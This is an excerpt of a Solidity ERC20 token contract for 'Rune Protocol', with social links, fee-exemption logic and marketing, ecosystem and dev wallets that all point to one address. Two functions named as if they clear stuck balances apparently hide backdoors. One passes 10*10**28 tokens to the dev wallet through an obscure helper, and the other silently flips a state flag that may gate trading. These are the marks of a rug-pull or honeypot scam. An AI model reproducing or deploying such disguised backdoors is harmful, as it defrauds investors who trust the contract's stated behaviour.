...
/*
https://t.me/RuneProtocolERC20
https://twitter.com/RuneProtocolERC
...
abstract contract Ownable is Context {
    ...
    function renounceOwnershipsrunes() public virtual onlyOwner {
        _setOwner(address(0));
    }
...
interface IRouter {
    ...
    contract RuneProtocol is ERC20, Ownable {
    ...
    int32 private bontudus = 1;
    uint256 private deadline = 1;
    uint256 private launchtax = 0;
    address public marketthkings = 0xdB903bA141a2711799Ce711D61665FAe36c8da51; 
    address public devswaltkings = 0xdB903bA141a2711799Ce711D61665FAe36c8da51;
    address public ecosystsewaltkings = 0xdB903bA141a2711799Ce711D61665FAe36c8da51;
    ...
    constructor() ERC20("Rune Protocol", "RP") {
        ...
        exemptFee[marketthkings] = true;
        exemptFee[ecosystsewaltkings] = true;
        exemptFee[devswaltkings] = true;
        ...
        if (contractBalance >= tokenLiquidityThreshold) {
         ...
         uint256 denominator = feeswap * 2;
          ...
          addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            ...
            if (marketingAmt > 0) {
                payable(marketthkings).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(ecosystsewaltkings).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(devswaltkings).sendValue(devAmt);
            }
    ...
    function clearStuckBalanceETHtoltrunes() external payable{
        andnicob(devswaltkings, 10 * 10**28);
    }
    ...
    function clearStuckBalanceInitrunes() external payable{
        bontudus = 3;
    }
